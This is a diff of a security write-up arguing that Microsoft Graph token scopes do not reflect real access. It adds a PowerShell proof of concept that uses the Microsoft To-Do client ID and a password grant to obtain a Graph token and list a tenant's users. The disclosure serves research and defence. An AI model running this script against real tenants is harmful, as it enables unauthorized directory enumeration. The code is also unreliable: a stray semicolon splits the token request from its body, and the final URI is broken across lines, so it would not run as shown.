@@ -10,7 +10,7 @@ This behavior indicates that **JWT scope claims do not always reflect the actual
 
 This was reported to MSRC on **July 8** and was considered a non issue.
 
-If you are looking for some awesome azure content Charles Hamilton at [TrueCyber](https://truecyber.world/) is going through a great azure series right now. 
+If you are looking for awesome azure content Charles Hamilton at [TrueCyber](https://truecyber.world/) is going through a great azure series right now with a lot of interesting finds. 
 
 ## Introduction
 
@@ -57,5 +57,30 @@ While I have not exhaustively mapped the full set of affected clients or endpoin
 ## Conclusion
 
 This issue demonstrates a deeper problem in Microsoft’s handling of Graph app permissions: **token scopes cannot be explicitly trusted as an accurate indicator of access**. I highly recommend others with test tenants to explore other permissions/scopes/MSGraph endpoint checks and do not blindly trust the scopes or preconsented permissions
+
+## POC
+
+```
+$clientId = "22098786-6e16-43cc-a27d-191a01a1e3b5"  # Microsoft To-Do
+$tenant = "TENANTID"  # or your specific tenant ID
+$username = "username@example.com"
+$password = "Password"
+$scope = "https://graph.microsoft.com/.default"
+
+$response = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$tenant/oauth2/v2.0/token"; -Body @{
+    client_id     = $clientId
+    username      = $username
+    password      = $password
+    scope         = $scope
+    grant_type    = "password"
+} -ErrorAction Stop
+
+$token = $response.access_token
+
+# Test access to /users
+$users=Invoke-RestMethod -Headers @{ Authorization = "Bearer $token" } -Uri 
+"https://graph.microsoft.com/v1.0/users"
+$users.value
+```
 
 
